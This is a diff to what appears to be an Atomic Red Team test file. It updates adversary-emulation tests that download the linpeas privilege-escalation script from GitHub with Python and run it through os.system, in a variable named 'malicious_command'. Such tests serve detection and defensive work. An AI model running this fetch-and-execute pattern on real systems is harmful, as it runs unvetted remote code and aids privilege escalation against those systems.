@@ -10,7 +10,7 @@ atomic_tests:
       script_url: 
         description: Shell script public URL
         type: String
-        default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+        default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
       payload_file_name: 
         description: Name of shell script downloaded from the script_url
         type: String
@@ -27,12 +27,13 @@ atomic_tests:
     dependencies: 
       - description: Verify if python is in the environment variable path and attempt to import requests library.
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: |
           pip install requests
     executor: 
       command: |
+        which_python=$(which python || which python3 || which python2)
         $which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
       name: sh
       cleanup_command: |
@@ -50,7 +51,7 @@ atomic_tests:
       script_url: 
         description: Shell script public URL
         type: String
-        default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+        default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
       payload_file_name: 
         description: Shell script file name downloaded from the script_url
         type: String
@@ -68,12 +69,13 @@ atomic_tests:
       - description: |
           Requires Python
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: |
           pip install requests    
     executor: 
       command: |
+        which_python=$(which python || which python3 || which python2)
         echo 'import requests' > #{python_script_name}
         echo 'import os' >> #{python_script_name}
         echo 'url = "#{script_url}"' >> #{python_script_name}
@@ -102,7 +104,7 @@ atomic_tests:
       script_url: 
         description: URL hosting external malicious payload
         type: String
-        default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+        default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
       payload_file_name: 
         description: Shell script file name downloaded from the script_url
         type: String
@@ -124,12 +126,13 @@ atomic_tests:
       - description: |
           Requires Python
         prereq_command: |
-          which_python=`which python`; python -V
+          which_python=$(which python || which python3 || which python2); $which_python -V
           $which_python -c 'import requests' 2>/dev/null; echo $?
         get_prereq_command: |
           pip install requests    
     executor: 
       command: |
+        which_python=$(which python || which python3 || which python2)
         echo 'import requests' > #{python_script_name}
         echo 'import os' >> #{python_script_name}
         echo 'url = "#{script_url}"' >> #{python_script_name}
